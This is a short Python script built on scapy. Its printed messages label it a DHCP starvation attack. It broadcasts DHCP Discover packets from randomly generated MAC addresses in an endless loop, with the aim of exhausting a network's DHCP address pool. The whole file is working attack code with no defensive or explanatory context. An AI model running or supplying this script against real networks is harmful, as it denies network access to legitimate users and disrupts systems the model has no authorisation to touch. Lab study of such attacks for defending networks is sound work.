from scapy.all import *
from scapy.layers.dhcp import *
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether
import random
import time

def generate_mac():
    """Generate a random MAC address."""
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )

def send_dhcp_discover():
    """Send a DHCP Discover packet."""
    mac = generate_mac()
    dhcp_discover = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=[mac2str(mac)], xid=random.randint(0, 0xFFFFFFFF)) /
        DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(dhcp_discover, verbose=0, iface="Ethernet")

def main():
    """Main function to send multiple DHCP Discover packets."""
    print("Starting DHCP starvation attack...")
    try:
        while True:
            send_dhcp_discover()
            time.sleep(0.1)  # Add a delay to avoid overwhelming the network
    except KeyboardInterrupt:
        print("Attack stopped.")

if __name__ == "__main__":

    main()
